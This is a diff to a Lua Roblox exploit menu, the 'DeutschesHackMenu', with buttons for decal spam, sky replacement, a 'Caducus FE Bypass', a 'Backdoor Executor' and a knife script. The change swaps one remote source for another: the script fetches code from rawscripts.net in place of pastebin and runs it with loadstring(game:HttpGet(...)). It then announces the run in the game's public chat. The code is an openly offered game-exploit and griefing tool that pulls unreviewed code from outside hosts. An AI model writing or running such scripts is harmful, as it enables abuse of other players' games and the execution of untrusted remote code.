@@ -78,19 +78,19 @@ if not _G.DeutschesMenu then
         end)
     end
 
-    -- 5. Knife FE Executor
+    -- 5. Knife FE Executor (Aktualisiert)
     local function knifeFEAusfuehren()
         pcall(function()
-            -- Knife FE Script von Pastebin
-            loadstring(game:HttpGet("https://pastebin.com/raw/apzME85h", true))()
+            -- Knife FE v4 von rawscripts.net
+            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-knife-v4-24753", true))()
             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
-                "✅ Knife FE ausgeführt", 
+                "✅ Knife FE v4 ausgeführt", 
                 "All"
             )
         end)
     end
 
-    -- ========== ERWEITERTES DEUTSCHES MENÜ ========== --
+    -- ========== DEUTSCHES MENÜ ========== --
     
     local function erstelleMenu()
         if game:GetService("CoreGui"):FindFirstChild("DeutschesHackMenu") then
@@ -121,12 +121,12 @@ if not _G.DeutschesMenu then
         Titel.TextSize = 16
         Titel.Parent = HauptFrame
 
-        -- Menüknöpfe mit neuer Knife FE Funktion
+        -- Menüknöpfe mit aktualisierter Knife FE Funktion
         local knoepfe = {
             {Text = "🎨 DECAL SPAM", Pos = 0.09, Color = Color3.fromRGB(0, 150, 255), Func = decalSpam},
             {Text = "🌌 HIMMEL ERSETZEN", Pos = 0.18, Color = Color3.fromRGB(100, 0, 200), Func = himmelErsetzen},
             {Text = "⚡ CADUCUS FE", Pos = 0.27, Color = Color3.fromRGB(139, 0, 139), Func = caducusAusfuehren},
-            {Text = "🔪 KNIFE FE", Pos = 0.36, Color = Color3.fromRGB(200, 0, 0), Func = knifeFEAusfuehren},
+            {Text = "🔪 KNIFE FE v4", Pos = 0.36, Color = Color3.fromRGB(200, 0, 0), Func = knifeFEAusfuehren},
             {Text = "🔓 BACKDOOR EXECUTOR", Pos = 0.45, Color = Color3.fromRGB(0, 100, 0), Func = backdoorAusfuehren}
         }
 
@@ -145,11 +145,11 @@ if not _G.DeutschesMenu then
             button.MouseButton1Click:Connect(knopf.Func)
         end
 
-        -- Info Text mit allen Funktionen
+        -- Info Text
         local InfoText = Instance.new("TextLabel")
         InfoText.Size = UDim2.new(0.9, 0, 0.25, 0)
         InfoText.Position = UDim2.new(0.05, 0, 0.62, 0)
-        InfoText.Text = "📋 FUNKTIONEN:\n• Decal Spam System\n• Himmel Textur Wechsel\n• Caducus FE Bypass\n• Knife FE Script\n• Backdoor Executor\n\nTexture ID: " .. targetTextureID
+        InfoText.Text = "📋 FUNKTIONEN:\n• Decal Spam System\n• Himmel Textur Wechsel\n• Caducus FE Bypass\n• Knife FE v4 Script\n• Backdoor Executor\n\nTexture ID: " .. targetTextureID
         InfoText.TextColor3 = Color3.fromRGB(200, 200, 100)
         InfoText.BackgroundTransparency = 1
         InfoText.Font = Enum.Font.SourceSans
